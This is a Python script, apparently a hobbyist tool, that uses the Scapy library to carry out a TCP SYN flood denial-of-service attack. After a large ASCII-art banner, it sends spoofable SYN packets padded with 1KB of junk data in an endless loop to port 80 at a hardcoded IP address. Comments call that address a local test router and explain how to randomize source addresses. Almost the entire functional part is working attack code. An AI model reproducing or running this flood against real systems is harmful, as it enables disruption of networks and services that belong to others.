# _*_ coding: utf-8 _*_
import socket
import os
import random
import time
from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

os.system("clear")
print(" ")
print("\033[32m       @@        @@ @   @@ @ @                                            \033[0m")
print("\033[32m     @ @@ @    @@       @@     @                                          \033[0m")
print("\033[31m       @@      @@       @@     @                                          \033[0m")
print("\033[31m       ©©   ©  ©©       ©©     ©                                          \033[0m")
print("\033[33m        ©© ©     ©© ©   ©© © ©                                            \033[0m")
print("\033[33m                        ©©                                                \033[0m")
print("\033[32m                             @@        @@                          @@        \033[0m")
print("\033[32m                   @@ @ @  @ @@ @ @  @ @@ @ @    @@ @ @    @@ @ @  @@   @    \033[0m")   
print("\033[31m                 @@     @    @@        @@      @@     @  @@        @@  @     \033[0m") 
print("\033[31m                 @@     @    @@        @@      @@     @  @@        @@ @      \033[0m")  
print("\033[33m                 ©©     ©    ©©  ©     ©©  ©   ©©     ©  ®®        ©©  ©     \033[0m")   
print("\033[33m                   ©© © ©      ©©       ©©       ©© © ©    ®® © ©  ©©    ©   \033[0m")  
print("\033[33m                                                                             \033[0m")
print("\033[33m   ================ Design ==================================================                                                                               ")
print("\033[33m                                        \033[0m") 
print("\033[32m                                         \033[0m") 
print("\033[32m                                          \033[0m")              
print("\033[31m                                           \033[0m")      
print("\033[31m    ==================================        \033[0m") 
print("\033[33m            \033[0m")
print("\033[32m             \033[0m")
print("\033[31m          \033[0m")
# I'm using my local router for testing
target_ip = "192.168.4.1"

# for HTTP use port 80 on the router
target_port = 80

# make the IP packet, with target_ip as the destination IP address
ip = IP(dst=target_ip)

# for IP spoofing use this (set src address to a spoofed random IP address in the private network range:
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)


# make a TCP SYN packet with random source port (sport), random short ranges from 1 to 65535
# S flag means it's a SYN packet
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# add 1KB of raw data to flood the network
raw = Raw(b"X"*1024)


# now stack up the packet's layers:
p = ip / tcp / raw

# send the packet in a loop until CTRL-C is pressed
# send() sends packets at layer 3
send(p, loop=1, verbose=1)
